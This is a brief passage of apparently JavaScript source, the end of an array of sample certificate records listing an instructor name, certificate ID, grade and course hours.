    instructorName: 'Commander James Vance',
    certificateId: 'CVA-2026-773104',
    grade: '95% Honors',
    hours: 30
  }
];
